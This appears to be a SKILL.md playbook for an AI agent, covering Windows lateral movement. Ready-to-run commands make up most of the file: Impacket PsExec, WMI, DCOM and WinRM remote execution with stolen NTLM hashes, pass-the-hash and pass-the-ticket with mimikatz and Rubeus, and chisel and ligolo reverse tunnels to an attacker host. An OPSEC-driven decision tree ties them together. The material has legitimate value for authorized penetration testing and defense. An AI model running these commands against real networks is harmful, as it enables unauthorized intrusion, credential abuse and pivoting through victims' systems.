---
name: windows-lateral-movement
description: >-
  Windows lateral movement playbook. Use when pivoting between Windows hosts via PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash, overpass-the-hash, or pass-the-ticket techniques.
---

# SKILL: Windows Lateral Movement

## 0. RELATED ROUTING

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md)
- [windows-av-evasion](../windows-av-evasion/SKILL.md)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)

---

## 1. REMOTE EXECUTION METHODS COMPARISON

| Method | Port | Cred Type | Creates Service? | File on Disk? | OPSEC |
|---|---|---|---|---|---|
| PsExec | 445 | Password/Hash | Yes (PSEXESVC) | Yes | Low |
| Impacket smbexec | 445 | Password/Hash | Yes (temp) | No | Medium |
| Impacket atexec | 445 | Password/Hash | No (schtask) | No | Medium |
| WMI | 135+dyn | Password/Hash | No | No | High |
| WinRM | 5985/5986 | Password/Hash/Ticket | No | No | High |
| DCOM | 135+dyn | Password/Hash | No | No | High |
| RDP | 3389 | Password/Hash (RA) | No | No | Low |

---

## 2. PSEXEC VARIANTS

```bash
# Impacket PsExec
psexec.py DOMAIN/administrator:password@TARGET_IP
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# Kerberos
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Stealthier (no binary upload)
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# Scheduled task
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

---

## 3. WMI

```bash
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create \
    -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" \
    -ComputerName TARGET -Credential $cred
```

---

## 4. WINRM

```bash
evil-winrm -i TARGET_IP -u administrator -p password
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
evil-winrm -i target.domain.com -r DOMAIN.COM  # Kerberos
```

```powershell
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## 5. DCOM

```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

```bash
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. PASS-THE-HASH (PTH)

```bash
crackmapexec smb TARGETS -u administrator -H NTLM_HASH
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
evil-winrm -i TARGET -u user -H NTLM_HASH
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

---

## 7. OVERPASS-THE-HASH

Convert NTLM hash → Kerberos TGT → pure Kerberos auth.

```bash
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@target.domain.com
```

---

## 8. PASS-THE-TICKET

```bash
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. PIVOTING

```bash
# SSH SOCKS proxy
ssh -D 1080 user@COMPROMISED_HOST

# Chisel
chisel server --reverse -p 8080   # attacker
chisel client ATTACKER:8080 R:socks  # compromised host

# Ligolo-ng
ligolo-proxy -selfcert -laddr 0.0.0.0:11601  # attacker
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert  # compromised
```

---

## 10. DECISION TREE

```
Credentials in hand
│
├── Plaintext password → any method
├── NTLM hash → PTH (§6) or Overpass-the-Hash (§7)
├── Kerberos ticket → Pass-the-Ticket (§8)
│
├── OPSEC HIGH → WMI (§3) / DCOM (§5) / WinRM (§4)
├── OPSEC MEDIUM → smbexec / atexec (§2)
├── OPSEC LOW → PsExec (§2) / RDP (§6)
│
├── SMB signing → WMI/WinRM/DCOM
├── WinRM disabled → WMI/DCOM
└── Need tunnel → SSH/Chisel/Ligolo (§9)
```
